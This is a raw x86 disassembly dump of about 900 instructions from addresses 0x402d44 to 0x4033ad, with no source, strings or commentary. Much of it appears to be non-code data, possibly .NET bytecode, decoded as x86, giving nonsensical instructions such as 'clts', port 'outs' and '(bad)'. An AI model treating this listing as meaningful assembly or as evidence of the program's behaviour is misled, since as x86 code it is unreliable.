  402d44:	add    BYTE PTR [edx],cl
  402d46:	or     edx,DWORD PTR [edi]
  402d48:	or     al,BYTE PTR [esi]
  402d4a:	sub    eax,0x5e7306
  402d4f:	add    BYTE PTR [edx],cl
  402d51:	jp     0x402d5a
  402d53:	sub    bl,BYTE PTR [ebx]
  402d55:	xor    BYTE PTR [ebx],al
  402d57:	add    BYTE PTR [eax+0x0],dh
  402d5a:	add    BYTE PTR [eax],al
  402d5c:	or     eax,0x17110000
  402d61:	or     al,BYTE PTR [edx]
  402d63:	add    edx,DWORD PTR [esi]
  402d65:	sub    BYTE PTR ds:0xb060000,bh
  402d6b:	pop    es
  402d6c:	sub    al,0x5b
  402d6e:	pop    es
  402d6f:	sub    BYTE PTR [edx],bh
  402d71:	add    BYTE PTR [eax],al
  402d73:	push   es
  402d74:	or     al,0x4
  402d76:	jb     0x402dd5
  402d78:	add    eax,0x6f1b7000
  402d7d:	jbe    0x402d7f
  402d7f:	add    BYTE PTR [edx],cl
  402d81:	sub    al,0x1d
  402d83:	push   ss
  402d84:	or     eax,0x28031204
  402d89:	pop    edx
  402d8a:	add    BYTE PTR [eax],al
  402d8c:	push   es
  402d8d:	or     DWORD PTR es:[esi+eax*1],ebp
  402d91:	jae    0x402e0a
  402d93:	add    BYTE PTR [eax],al
  402d95:	or     bh,BYTE PTR [edx+0x4]
  402d98:	sub    BYTE PTR [eax+0x0],bh
  402d9b:	add    BYTE PTR [edx],cl
  402d9d:	sub    ecx,DWORD PTR es:[edi]
  402da0:	add    al,0x28
  402da2:	jns    0x402da4
  402da4:	add    BYTE PTR [edx],cl
  402da6:	sub    al,0x7
  402da8:	add    al,0x28
  402daa:	js     0x402dac
  402dac:	add    BYTE PTR [edx],cl
  402dae:	fimul  WORD PTR es:[edi]
  402db1:	adc    eax,DWORD PTR [ecx+edx*1]
  402db4:	add    al,0x75
  402db6:	sub    al,BYTE PTR [eax]
  402db8:	add    BYTE PTR [ecx],al
  402dba:	sub    al,0x2
  402dbc:	push   ss
  402dbd:	or     bl,dh
  402dbf:	add    dh,bl
  402dc1:	pop    es
  402dc2:	or     BYTE PTR [edi+0x7a],ch
  402dc5:	add    BYTE PTR [eax],al
  402dc7:	or     bl,ah
  402dc9:	fiadd  WORD PTR [ebx]
  402dcb:	es (bad) 
  402dcd:	sbb    al,BYTE PTR [esi]
  402dcf:	sub    al,BYTE PTR [ecx]
  402dd1:	sub    BYTE PTR [eax],al
  402dd3:	add    BYTE PTR [eax],al
  402dd5:	add    BYTE PTR ds:0x513c00,dl
  402ddb:	clts   
  402ddd:	add    BYTE PTR [eax],al
  402ddf:	add    DWORD PTR [edx],eax
  402de1:	add    BYTE PTR ds:0x624d00,dl
  402de7:	pop    es
  402de8:	add    BYTE PTR [eax],al
  402dea:	add    BYTE PTR [eax],al
  402dec:	add    BYTE PTR [eax],al
  402dee:	add    al,BYTE PTR [eax]
  402df0:	imul   ebp,DWORD PTR [ebx+0x0],0x103
  402df7:	add    DWORD PTR [ebx],edx
  402df9:	xor    BYTE PTR [esi],al
  402dfb:	add    BYTE PTR [ebx+0xe000000],ch
  402e01:	add    BYTE PTR [eax],al
  402e03:	adc    DWORD PTR ds:0x137e,eax
  402e09:	or     dl,BYTE PTR [ecx+0x2]
  402e0c:	pop    ss
  402e0d:	lea    edx,[eax+eax*1+0x0]
  402e11:	add    DWORD PTR [ebx],edx
  402e13:	push   es
  402e14:	adc    DWORD PTR [esi],eax
  402e16:	push   ss
  402e17:	pop    ds
  402e18:	pop    esp
  402e19:	popf   
  402e1a:	adc    DWORD PTR [esi],eax
  402e1c:	outs   dx,DWORD PTR ds:[esi]
  402e1d:	jnp    0x402e1f
  402e1f:	add    BYTE PTR [edx],cl
  402e21:	or     al,0x8
  402e23:	mov    gs,WORD PTR [ecx+0x17]
  402e26:	xor    ebx,DWORD PTR [ecx]
  402e28:	add    cl,BYTE PTR [edx]
  402e2a:	push   es
  402e2b:	pop    ds
  402e2c:	inc    eax
  402e2d:	outs   dx,DWORD PTR ds:[esi]
  402e2e:	outs   dx,DWORD PTR ds:[esi]
  402e2f:	add    BYTE PTR [eax],al
  402e31:	or     dl,BYTE PTR ds:0xb14042e
  402e37:	sub    edx,DWORD PTR [eax]
  402e39:	jb     0x402eb6
  402e3b:	add    DWORD PTR [eax],eax
  402e3d:	jo     0x402e4a
  402e3f:	sub    ecx,DWORD PTR [eax]
  402e41:	or     BYTE PTR [esi],dl
  402e43:	call   0x140a:0x9a17080b
  402e4a:	or     eax,0x6292c04
  402e4f:	pop    es
  402e50:	add    ebx,DWORD PTR [ecx]
  402e52:	push   ss
  402e53:	adc    al,BYTE PTR [ebx]
  402e55:	sub    BYTE PTR [eax+0x0],cl
  402e58:	add    BYTE PTR [esi],al
  402e5a:	sub    eax,0x722844
  402e5f:	add    BYTE PTR [edx],cl
  402e61:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402e65:	or     dl,BYTE PTR [ebx]
  402e67:	add    al,0x11
  402e69:	add    al,0x2c
  402e6b:	or     DWORD PTR ds:0x1c6f0411,eax
  402e71:	add    BYTE PTR [eax],al
  402e73:	or     dl,BYTE PTR [ecx+0x14]
  402e76:	sub    al,BYTE PTR [esi]
  402e78:	pop    es
  402e79:	add    ebx,DWORD PTR [esi]
  402e7b:	push   ss
  402e7c:	adc    al,BYTE PTR [ebx]
  402e7e:	sub    BYTE PTR [eax+0x0],cl
  402e81:	add    BYTE PTR [esi],al
  402e83:	sub    eax,0x72281b
  402e88:	add    BYTE PTR [edx],cl
  402e8a:	sub    BYTE PTR [eax+eax*1+0x0],bh
  402e8e:	or     dl,BYTE PTR [ebx]
  402e90:	add    eax,0x92c0511
  402e95:	add    eax,0x1c6f0511
  402e9a:	add    BYTE PTR [eax],al
  402e9c:	or     dl,BYTE PTR [ecx+0x14]
  402e9f:	sub    cl,BYTE PTR [ecx]
  402ea1:	sub    al,0x8
  402ea3:	or     DWORD PTR [edi+0x5d],ebp
  402ea6:	add    BYTE PTR [eax],al
  402ea8:	or     ch,BYTE PTR [edx+eax*1]
  402eab:	adc    al,0x2a
  402ead:	or     DWORD PTR [edx],ebp
  402eaf:	add    BYTE PTR [ebx],dl
  402eb1:	xor    BYTE PTR [eax+eax*1],al
  402eb4:	or     eax,DWORD PTR [eax]
  402eb6:	add    BYTE PTR [eax],al
  402eb8:	sldt   WORD PTR [eax]
  402ebb:	adc    DWORD PTR [edx],eax
  402ebd:	add    eax,DWORD PTR [edx+edx*1]
  402ec0:	add    BYTE PTR [eax],ch
  402ec2:	cmp    al,0x0
  402ec4:	add    BYTE PTR [esi],al
  402ec6:	sub    al,BYTE PTR [eax]
  402ec8:	sbb    esi,DWORD PTR [eax]
  402eca:	pop    es
  402ecb:	add    BYTE PTR [ebp+0x0],dh
  402ece:	add    BYTE PTR [eax],al
  402ed0:	adc    BYTE PTR [eax],al
  402ed2:	add    BYTE PTR [ecx],dl
  402ed4:	add    dl,BYTE PTR [edi]
  402ed6:	lea    edx,[eax+eax*1+0x0]
  402eda:	add    DWORD PTR [ebx],edx
  402edc:	or     BYTE PTR [ecx],dl
  402ede:	or     BYTE PTR [esi],dl
  402ee0:	pop    ds
  402ee1:	pop    esp
  402ee2:	popf   
  402ee3:	adc    DWORD PTR [eax],ecx
  402ee5:	outs   dx,DWORD PTR ds:[esi]
  402ee6:	jnp    0x402ee8
  402ee8:	add    BYTE PTR [edx],cl
  402eea:	or     al,BYTE PTR [esi]
  402eec:	mov    gs,WORD PTR [ecx+0x17]
  402eef:	xor    edx,DWORD PTR [ebx+0x16]
  402ef2:	or     edx,DWORD PTR [esi]
  402ef4:	or     al,0x14
  402ef6:	add    ch,BYTE PTR [eax]
  402ef8:	daa    
  402ef9:	add    BYTE PTR [eax],al
  402efb:	push   es
  402efc:	adc    al,BYTE PTR [ecx]
  402efe:	adc    al,0x12
  402f00:	add    dl,BYTE PTR [edx]
  402f02:	add    ebp,DWORD PTR [eax]
  402f04:	dec    ecx
  402f05:	add    BYTE PTR [eax],al
  402f07:	push   es
  402f08:	es pop es
  402f0a:	push   ss
  402f0b:	xor    BYTE PTR [edx],al
  402f0d:	push   ss
  402f0e:	sub    al,BYTE PTR [edi]
  402f10:	jae    0x402f3c
  402f12:	add    BYTE PTR [eax],al
  402f14:	push   es
  402f15:	adc    eax,DWORD PTR [eax+ecx*1]
  402f18:	jae    0x402f8b
  402f1a:	add    BYTE PTR [eax],al
  402f1c:	or     dl,BYTE PTR [ebx]
  402f1e:	add    eax,0x4110214
  402f23:	adc    al,BYTE PTR [ecx]
  402f25:	adc    DWORD PTR ds:0x3120212,eax
  402f2b:	sub    BYTE PTR [ecx+0x0],cl
  402f2e:	add    BYTE PTR [esi],al
  402f30:	adc    eax,DWORD PTR [esi]
  402f32:	adc    DWORD PTR [esi],eax
  402f34:	adc    eax,DWORD PTR [edi]
  402f36:	fimul  WORD PTR [esi]
  402f38:	adc    DWORD PTR [esp+ebp*1],eax
  402f3b:	pop    es
  402f3c:	adc    DWORD PTR [edi+ebp*2],eax
  402f3f:	jge    0x402f41
  402f41:	add    BYTE PTR [edx],cl
  402f43:	fcom   QWORD PTR [edi]
  402f45:	sub    dl,BYTE PTR [ecx]
  402f47:	pop    es
  402f48:	sub    al,BYTE PTR [eax]
  402f4a:	add    BYTE PTR [eax],al
  402f4c:	add    DWORD PTR [eax],edx
  402f4e:	add    BYTE PTR [eax],al
  402f50:	add    al,BYTE PTR [eax]
  402f52:	inc    ebx
  402f53:	add    BYTE PTR [ecx],ah
  402f55:	add    BYTE PTR fs:[eax+eax*1],cl
  402f59:	add    BYTE PTR [eax],al
  402f5b:	add    BYTE PTR [ebx],bl
  402f5d:	xor    BYTE PTR [edi],al
  402f5f:	add    bl,cl
  402f61:	add    BYTE PTR [eax],al
  402f63:	add    BYTE PTR [ecx],dl
  402f65:	add    BYTE PTR [eax],al
  402f67:	adc    DWORD PTR [ebx],eax
  402f69:	push   ss
  402f6a:	push   edx
  402f6b:	push   ss
  402f6c:	or     dl,BYTE PTR [esi]
  402f6e:	or     edx,DWORD PTR [edx+eax*1]
  402f71:	sub    BYTE PTR [edi],ah
  402f73:	add    BYTE PTR [eax],al
  402f75:	push   es
  402f76:	adc    al,BYTE PTR [eax]
  402f78:	adc    al,0x12
  402f7a:	add    DWORD PTR [edx],edx
  402f7c:	add    ch,BYTE PTR [eax]
  402f7e:	dec    ecx
  402f7f:	add    BYTE PTR [eax],al
  402f81:	push   es
  402f82:	es push es
  402f84:	push   ss
  402f85:	xor    BYTE PTR [eax+0x2],bl
  402f88:	pop    ds
  402f89:	pop    esp
  402f8a:	outs   dx,DWORD PTR ds:[esi]
  402f8b:	outs   dx,DWORD PTR ds:[esi]
  402f8c:	add    BYTE PTR [eax],al
  402f8e:	or     cl,BYTE PTR ds:0x2331509
  402f94:	adc    al,0x2a
  402f96:	sub    BYTE PTR [esi+0x0],bh
  402f99:	add    BYTE PTR [edx],cl
  402f9b:	adc    eax,DWORD PTR [edx+eax*1]
  402f9e:	push   ss
  402f9f:	or     DWORD PTR [edi+0x70],ebp
  402fa2:	add    BYTE PTR [eax],al
  402fa4:	or     dl,BYTE PTR [ebx]
  402fa6:	add    eax,0x58170902
  402fab:	outs   dx,DWORD PTR ds:[esi]
  402fac:	jg     0x402fae
  402fae:	add    BYTE PTR [edx],cl
  402fb0:	adc    eax,DWORD PTR [esi]
  402fb2:	adc    DWORD PTR [ecx+edx*1],eax
  402fb5:	add    eax,0x80281b
  402fba:	add    BYTE PTR [edx],cl
  402fbc:	sub    al,0x2
  402fbe:	adc    al,0x2a
  402fc0:	adc    al,0x11
  402fc2:	push   es
  402fc3:	sub    BYTE PTR [edi],ah
  402fc5:	add    BYTE PTR [eax],al
  402fc7:	push   es
  402fc8:	adc    al,BYTE PTR [eax]
  402fca:	adc    al,0x12
  402fcc:	add    DWORD PTR [edx],edx
  402fce:	add    ch,BYTE PTR [eax]
  402fd0:	dec    ecx
  402fd1:	add    BYTE PTR [eax],al
  402fd3:	push   es
  402fd4:	es push es
  402fd6:	push   ss
  402fd7:	xor    BYTE PTR [edx],al
  402fd9:	adc    al,0x2a
  402fdb:	adc    DWORD PTR [esi],eax
  402fdd:	adc    BYTE PTR [eax],al
  402fdf:	push   es
  402fe0:	jae    0x40300c
  402fe2:	add    BYTE PTR [eax],al
  402fe4:	push   es
  402fe5:	adc    eax,DWORD PTR [edi]
  402fe7:	pop    es
  402fe8:	jae    0x40305b
  402fea:	add    BYTE PTR [eax],al
  402fec:	or     dl,BYTE PTR [ebx]
  402fee:	or     BYTE PTR [edx+eax*1],dl
  402ff1:	adc    DWORD PTR [edi],eax
  402ff3:	adc    al,BYTE PTR [eax]
  402ff5:	adc    DWORD PTR [eax],ecx
  402ff7:	adc    al,BYTE PTR [ecx]
  402ff9:	adc    al,BYTE PTR [edx]
  402ffb:	sub    BYTE PTR [ecx+0x0],cl
  402ffe:	add    BYTE PTR [esi],al
  403000:	adc    ecx,DWORD PTR [ecx]
  403002:	adc    DWORD PTR [ecx],ecx
  403004:	sub    al,0x1a
  403006:	or     BYTE PTR [eax],bl
  403008:	or     BYTE PTR cs:[eax],cl
  40300b:	sbb    ebp,DWORD PTR [esi]
  40300d:	add    al,0x8
  40300f:	sbb    dh,BYTE PTR [ebx]
  403011:	add    eax,DWORD PTR [ebx]
  403013:	pop    ss
  403014:	push   edx
  403015:	adc    DWORD PTR [edi],eax
  403017:	sub    BYTE PTR [eax+0x0],al
  40301a:	add    BYTE PTR [esi],al
  40301c:	adc    ecx,DWORD PTR [edx]
  40301e:	ficom  WORD PTR [eax]
  403020:	fimul  WORD PTR [ecx+edx*1]
  403023:	pop    es
  403024:	sub    al,0x7
  403026:	adc    DWORD PTR [edi],eax
  403028:	outs   dx,DWORD PTR ds:[esi]
  403029:	jge    0x40302b
  40302b:	add    BYTE PTR [edx],cl
  40302d:	fcom   QWORD PTR [edx+ebp*1]
  403030:	adc    DWORD PTR [edx],ecx
  403032:	sub    al,BYTE PTR [eax]
  403034:	add    DWORD PTR [eax],edx
  403036:	add    BYTE PTR [eax],al
  403038:	add    al,BYTE PTR [eax]
  40303a:	jg     0x40303c
  40303c:	cmp    edi,DWORD PTR [edx+0xc00]
  403042:	add    BYTE PTR [eax],al
  403044:	adc    esi,DWORD PTR [eax]
  403046:	pop    es
  403047:	add    BYTE PTR [edx+0x0],dh
  40304a:	add    BYTE PTR [eax],al
  40304c:	adc    al,BYTE PTR [eax]
  40304e:	add    BYTE PTR [ecx],dl
  403050:	push   ss
  403051:	or     dl,BYTE PTR [esi]
  403053:	or     edx,DWORD PTR [edx+eax*1]
  403056:	adc    al,0x12
  403058:	add    BYTE PTR [edx+edx*1],dl
  40305b:	add    DWORD PTR [edx],edx
  40305d:	add    ch,BYTE PTR [eax]
  40305f:	dec    edx
  403060:	add    BYTE PTR [eax],al
  403062:	push   es
  403063:	es push es
  403065:	sub    eax,0x62a1402
  40306a:	jae    0x4030dd
  40306c:	add    BYTE PTR [eax],al
  40306e:	or     cl,BYTE PTR ds:0x717307
  403074:	add    BYTE PTR [edx],cl
  403076:	adc    eax,DWORD PTR [esp+edx*1]
  403079:	add    cl,BYTE PTR [ecx]
  40307b:	adc    al,BYTE PTR [eax]
  40307d:	adc    DWORD PTR [edx+edx*1],eax
  403080:	add    DWORD PTR [edx],edx
  403082:	add    ch,BYTE PTR [eax]
  403084:	dec    edx
  403085:	add    BYTE PTR [eax],al
  403087:	push   es
  403088:	sub    eax,0x92a1402
  40308d:	outs   dx,DWORD PTR ds:[esi]
  40308e:	add    DWORD PTR [eax],0x30160a00
  403094:	add    dl,BYTE PTR [edx+ebp*1]
  403097:	adc    DWORD PTR [edi+ebp*2],eax
  40309a:	add    DWORD PTR [eax],0x30160a00
  4030a0:	pop    es
  4030a1:	or     DWORD PTR [edi+0x74],ebp
  4030a4:	add    BYTE PTR [eax],al
  4030a6:	or     ch,BYTE PTR [edx]
  4030a8:	adc    DWORD PTR [edi+ebp*2],eax
  4030ab:	je     0x4030ad
  4030ad:	add    BYTE PTR [edx],cl
  4030af:	pop    ds
  4030b0:	pop    esp
  4030b1:	mov    WORD PTR [eax+eax*1+0x0],ss
  4030b5:	add    DWORD PTR [ecx],ecx
  4030b7:	outs   dx,DWORD PTR ds:[esi]
  4030b8:	je     0x4030ba
  4030ba:	add    BYTE PTR [edx],cl
  4030bc:	sub    BYTE PTR [edx+0x2a0a0000],al
  4030c2:	add    BYTE PTR [eax],al
  4030c4:	adc    esi,DWORD PTR [eax]
  4030c6:	add    al,BYTE PTR [eax]
  4030c8:	cmp    al,BYTE PTR [eax]
  4030ca:	add    BYTE PTR [eax],al
  4030cc:	pop    es
  4030cd:	add    BYTE PTR [eax],al
  4030cf:	adc    DWORD PTR [edx],eax
  4030d1:	sub    al,0x35
  4030d3:	add    ah,BYTE PTR [eax]
  4030d5:	and    BYTE PTR [edx],al
  4030d7:	add    BYTE PTR [eax],al
  4030d9:	outs   dx,DWORD PTR ds:[esi]
  4030da:	add    DWORD PTR [eax],0x0
  4030dd:	or     ch,BYTE PTR [edx+eax*1]
  4030e0:	pop    ss
  4030e1:	sub    al,BYTE PTR [edx]
  4030e3:	outs   dx,DWORD PTR ds:[esi]
  4030e4:	test   BYTE PTR [eax],al
  4030e6:	add    BYTE PTR [edx],cl
  4030e8:	jne    0x4030f9
  4030ea:	add    BYTE PTR [eax],al
  4030ec:	add    DWORD PTR [edx],ecx
  4030ee:	push   es
  4030ef:	sub    al,0x17
  4030f1:	push   es
  4030f2:	outs   dx,DWORD PTR ds:[esi]
  4030f3:	test   DWORD PTR [eax],eax
  4030f5:	add    BYTE PTR [edx],cl
  4030f7:	es push es
  4030f9:	outs   dx,DWORD PTR ds:[esi]
  4030fa:	test   DWORD PTR [eax],eax
  4030fc:	add    BYTE PTR [edx],cl
  4030fe:	add    ch,BYTE PTR [eax]
  403100:	inc    esp
  403101:	add    BYTE PTR [eax],al
  403103:	push   es
  403104:	sub    al,0x2
  403106:	pop    ss
  403107:	sub    dl,BYTE PTR [esi]
  403109:	sub    al,BYTE PTR [eax]
  40310b:	add    BYTE PTR [ebx],dl
  40310d:	xor    BYTE PTR [edx],al
  40310f:	add    BYTE PTR [eax+0x0],ch
  403112:	add    BYTE PTR [eax],al
  403114:	adc    eax,DWORD PTR [eax]
  403116:	add    BYTE PTR [ecx],dl
  403118:	push   ss
  403119:	or     dl,BYTE PTR [esi]
  40311b:	or     edx,DWORD PTR [esi]
  40311d:	or     al,0x16
  40311f:	or     eax,0x426f02
  403124:	add    BYTE PTR [edx],cl
  403126:	push   ds
  403127:	das    
  403128:	add    dl,BYTE PTR [esi]
  40312a:	sub    dl,BYTE PTR [esi]
  40312c:	adc    eax,DWORD PTR [ebx+ebp*1]
  40312f:	cmp    DWORD PTR [edx],eax
  403131:	adc    DWORD PTR [edi+ebp*2],eax
  403134:	inc    ebx
  403135:	add    BYTE PTR [eax],al
  403137:	or     dl,BYTE PTR [ebx]
  403139:	add    eax,0x86280511
  40313e:	add    BYTE PTR [eax],al
  403140:	or     ch,BYTE PTR [esp+eax*1]
  403143:	pop    ss
  403144:	or     ch,BYTE PTR [ebx]
  403146:	sbb    al,0x11
  403148:	add    eax,0x8728
  40314d:	or     ch,BYTE PTR [esp+eax*1]
  403150:	pop    ss
  403151:	or     al,0x2b
  403153:	movups XMMWORD PTR ds:0x8828,xmm0
  40315a:	or     ch,BYTE PTR [esp+eax*1]
  40315d:	pop    ss
  40315e:	or     ebp,DWORD PTR [ebx]
  403160:	add    dl,BYTE PTR [edi]
  403162:	or     eax,0x58170411
  403167:	adc    eax,DWORD PTR [ecx+edx*1]
  40316a:	add    al,0x2
  40316c:	outs   dx,DWORD PTR ds:[esi]
  40316d:	inc    edx
  40316e:	add    BYTE PTR [eax],al
  403170:	or     dh,BYTE PTR [edx]
  403172:	mov    ebp,0x7082c06
  403177:	sub    al,0x5
  403179:	or     BYTE PTR [edx+eax*1],ch
  40317c:	or     DWORD PTR [edx],ebp
  40317e:	push   ss
  40317f:	sub    dl,BYTE PTR [ebx]
  403181:	xor    BYTE PTR [edx],al
  403183:	add    BYTE PTR [ecx+0x14000000],bl
  403189:	add    BYTE PTR [eax],al
  40318b:	adc    DWORD PTR [esi],edx
  40318d:	or     dh,BYTE PTR [edx+0x63]
  403190:	add    eax,0x89737000
  403195:	add    BYTE PTR [eax],al
  403197:	or     cl,BYTE PTR [ebx]
  403199:	pop    es
  40319a:	add    ch,BYTE PTR [edi-0x76]
  40319d:	add    BYTE PTR [eax],al
  40319f:	or     ch,BYTE PTR [eax*1+0x580a1f06]
  4031a6:	or     dh,BYTE PTR [edx+0x6d]
  4031a9:	add    eax,0x89737000
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	or     cl,BYTE PTR [ebx]
  4031b2:	pop    es
  4031b3:	add    ch,BYTE PTR [edi-0x76]
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	or     ch,BYTE PTR [eax*1+0x581a1f06]
  4031bf:	or     dh,BYTE PTR [edx+0x79]
  4031c2:	add    eax,0x89737000
  4031c7:	add    BYTE PTR [eax],al
  4031c9:	or     cl,BYTE PTR [ebx]
  4031cb:	pop    es
  4031cc:	add    ch,BYTE PTR [edi-0x76]
  4031cf:	add    BYTE PTR [eax],al
  4031d1:	or     ch,BYTE PTR [eax*1+0x581a1f06]
  4031d8:	or     dh,BYTE PTR [edx-0x7b]
  4031db:	add    eax,0x89737000
  4031e0:	add    BYTE PTR [eax],al
  4031e2:	or     cl,BYTE PTR [ebx]
  4031e4:	pop    es
  4031e5:	add    ch,BYTE PTR [edi-0x76]
  4031e8:	add    BYTE PTR [eax],al
  4031ea:	or     ch,BYTE PTR [eax*1+0x581f1f06]
  4031f1:	or     al,BYTE PTR [esi]
  4031f3:	ins    BYTE PTR es:[edi],dx
  4031f4:	add    ch,BYTE PTR [edi+0x42]
  4031f7:	add    BYTE PTR [eax],al
  4031f9:	or     ch,BYTE PTR [eax+ebp*1-0x75]
  4031fd:	add    BYTE PTR [eax],al
  4031ff:	or     ch,BYTE PTR [eax]
  403201:	mov    WORD PTR [eax],es
  403203:	add    BYTE PTR [edx],cl
  403205:	and    eax,DWORD PTR [eax]
  403207:	add    BYTE PTR [eax],al
  403209:	add    BYTE PTR [eax],al
  40320b:	add    BYTE PTR [eax],al
  40320d:	inc    eax
  40320e:	sub    BYTE PTR [eax+eax*1+0xc5b0a00],cl
  403215:	or     BYTE PTR [ebx],ah
  403217:	add    BYTE PTR [eax],al
  403219:	add    BYTE PTR [eax],al
  40321b:	add    BYTE PTR [eax],al
  40321d:	dec    esp
  40321e:	inc    eax
  40321f:	xor    al,0x2
  403221:	push   ss
  403222:	sub    dl,BYTE PTR [edi]
  403224:	sub    al,BYTE PTR [eax]
  403226:	add    BYTE PTR [eax],al
  403228:	sbb    esi,DWORD PTR [eax]
  40322a:	or     eax,DWORD PTR [eax]
  40322c:	jl     0x40322e
  40322e:	add    BYTE PTR [eax],al
  403230:	adc    eax,0x16110000
  403235:	or     dl,BYTE PTR [edx]
  403237:	add    DWORD PTR [ebx],ebx
  403239:	jge    0x4032a1
  40323b:	add    BYTE PTR [eax],al
  40323d:	add    al,0x7e
  40323f:	push   edi
  403240:	add    BYTE PTR [eax],al
  403242:	or     cl,BYTE PTR [edx+edx*1]
  403245:	add    eax,esp
  403247:	jae    0x4032ad
  403249:	add    BYTE PTR [eax],al
  40324b:	or     bl,BYTE PTR [eax]
  40324d:	pop    ds
  40324e:	and    BYTE PTR [eax],ah
  403250:	and    BYTE PTR [edx],al
  403252:	add    BYTE PTR [eax],al
  403254:	push   ss
  403255:	push   ss
  403256:	push   ss
  403257:	push   ss
  403258:	push   ss
  403259:	push   ss
  40325a:	adc    al,BYTE PTR [edx]
  40325c:	sub    BYTE PTR [ecx+0x0],dl
  40325f:	add    BYTE PTR [esi],al
  403261:	or     al,BYTE PTR [esi]
  403263:	sub    al,0x49
  403265:	or     BYTE PTR [esi+0x57],bh
  403268:	add    BYTE PTR [eax],al
  40326a:	or     ch,BYTE PTR [eax]
  40326c:	data16 add BYTE PTR [eax],al
  40326f:	or     ch,BYTE PTR [esp+edi*1]
  403272:	jle    0x4032cb
  403274:	add    BYTE PTR [eax],al
  403276:	or     cl,BYTE PTR ds:0x3121802
  40327c:	sub    BYTE PTR [eax+eax*1+0x0],dl
  403280:	push   es
  403281:	sub    al,0xd
  403283:	or     DWORD PTR [eax],ecx
  403285:	adc    al,BYTE PTR [eax]
  403287:	sub    BYTE PTR [edx+0x0],dl
  40328a:	add    BYTE PTR [esi],al
  40328c:	sub    eax,0xde0a1602
  403291:	adc    eax,0x577e09
  403296:	add    BYTE PTR [edx],cl
  403298:	sub    BYTE PTR [esi+0x0],ah
  40329b:	add    BYTE PTR [edx],cl
  40329d:	sub    al,0x7
  40329f:	or     DWORD PTR [eax],ebp
  4032a1:	push   ebp
  4032a2:	add    BYTE PTR [eax],al
  4032a4:	push   es
  4032a5:	fmul   QWORD PTR es:[eax]
  4032a8:	sub    BYTE PTR [ebx+0x0],dl
  4032ab:	add    BYTE PTR [esi],al
  4032ad:	es push es
  4032af:	sub    al,BYTE PTR [ecx]
  4032b1:	adc    BYTE PTR [eax],al
  4032b3:	add    BYTE PTR [edx],al
  4032b5:	add    BYTE PTR [eax+eax*1+0x1a],al
  4032b9:	pop    esi
  4032ba:	add    BYTE PTR ds:0x0,dl
  4032c0:	adc    esi,DWORD PTR [eax]
  4032c2:	add    eax,0x2500
  4032c7:	add    BYTE PTR [esi],dl
  4032c9:	add    BYTE PTR [eax],al
  4032cb:	adc    DWORD PTR [edx],eax
  4032cd:	sub    eax,0x172a1602
  4032d2:	or     al,BYTE PTR [edx]
  4032d4:	outs   dx,DWORD PTR ds:[esi]
  4032d5:	test   DWORD PTR [eax],eax
  4032d7:	add    BYTE PTR [edx],cl
  4032d9:	pop    ds
  4032da:	adc    dl,BYTE PTR [edx]
  4032dc:	add    BYTE PTR [edx],bl
  4032de:	adc    al,BYTE PTR [ecx]
  4032e0:	sub    BYTE PTR [edi+0x0],al
  4032e3:	add    BYTE PTR [esi],al
  4032e5:	sub    eax,0x62a1602
  4032ea:	sbb    DWORD PTR [ebx],esi
  4032ec:	add    dl,BYTE PTR [edi]
  4032ee:	sub    dl,BYTE PTR [esi]
  4032f0:	sub    al,BYTE PTR [eax]
  4032f2:	add    BYTE PTR [eax],al
  4032f4:	adc    esi,DWORD PTR [eax]
  4032f6:	add    al,0x0
  4032f8:	adc    al,0x0
  4032fa:	add    BYTE PTR [eax],al
  4032fc:	sbb    BYTE PTR [eax],al
  4032fe:	add    BYTE PTR [ecx],dl
  403300:	jle    0x403359
  403302:	add    BYTE PTR [eax],al
  403304:	or     cl,BYTE PTR [edx]
  403306:	adc    al,0x2
  403308:	pop    ss
  403309:	adc    al,BYTE PTR [eax]
  40330b:	sub    BYTE PTR [ebp+0x0],cl
  40330e:	add    BYTE PTR [esi],al
  403310:	push   ss
  403311:	inc    BYTE PTR [ecx]
  403313:	sub    bl,BYTE PTR [esi]
  403315:	add    ch,BYTE PTR [eax]
  403317:	adc    al,0x0
  403319:	add    BYTE PTR [edx],cl
  40331b:	sub    bl,BYTE PTR [esi]
  40331d:	add    ch,BYTE PTR [eax]
  40331f:	adc    al,0x0
  403321:	add    BYTE PTR [edx],cl
  403323:	sub    bl,BYTE PTR [ebx]
  403325:	xor    BYTE PTR [ebx],al
  403327:	add    BYTE PTR [ebp+0x0],al
  40332a:	add    BYTE PTR [eax],al
  40332c:	sbb    DWORD PTR [eax],eax
  40332e:	add    BYTE PTR [ecx],dl
  403330:	add    dh,BYTE PTR [edx+0x5d]
  403333:	add    eax,0x6f1b7000
  403338:	jbe    0x40333a
  40333a:	add    BYTE PTR [edx],cl
  40333c:	sub    al,0x4
  40333e:	pop    ss
  40333f:	or     bl,dh
  403341:	xor    DWORD PTR [edx],eax
  403343:	jb     0x4032d8
  403345:	add    eax,0x6f1b7000
  40334a:	jbe    0x40334c
  40334c:	add    BYTE PTR [edx],cl
  40334e:	sub    al,0x4
  403350:	push   ss
  403351:	or     bl,dh
  403353:	pop    ds
  403354:	add    dh,BYTE PTR [edx-0x69]
  403357:	add    eax,0x266f7000
  40335c:	add    BYTE PTR [eax],al
  40335e:	or     ch,BYTE PTR [esp+eax*1]
  403361:	pop    ss
  403362:	or     bl,dh
  403364:	push   cs
  403365:	add    ch,BYTE PTR [eax]
  403367:	jns    0x403369
  403369:	add    BYTE PTR [edx],cl
  40336b:	or     bl,dh
  40336d:	add    eax,0x1600de26
  403372:	sub    al,BYTE PTR [esi]
  403374:	sub    al,BYTE PTR [eax]
  403376:	add    BYTE PTR [eax],al
  403378:	add    DWORD PTR [eax],edx
  40337a:	add    BYTE PTR [eax],al
  40337c:	add    BYTE PTR [eax],al
  40337e:	add    BYTE PTR [eax],al
  403380:	ds add BYTE PTR ds:[ebx],al
  403384:	push   es
  403385:	add    BYTE PTR [eax],al
  403387:	add    DWORD PTR [ebx],ebx
  403389:	xor    BYTE PTR [eax+eax*1],al
  40338c:	outs   dx,BYTE PTR ds:[esi]
  40338d:	add    BYTE PTR [eax],al
  40338f:	add    BYTE PTR [edx],bl
  403391:	add    BYTE PTR [eax],al
  403393:	adc    DWORD PTR [edx+ecx*1],edx
  403396:	add    edx,DWORD PTR [esi]
  403398:	push   edx
  403399:	add    dh,BYTE PTR [edx+0x5d]
  40339c:	add    eax,0x6f1b7000
  4033a1:	jbe    0x4033a3
  4033a3:	add    BYTE PTR [edx],cl
  4033a5:	sub    eax,0x22a1602
  4033aa:	sbb    BYTE PTR [edi+0x7f],ch
  4033ad:	add    BYTE PTR [eax],al
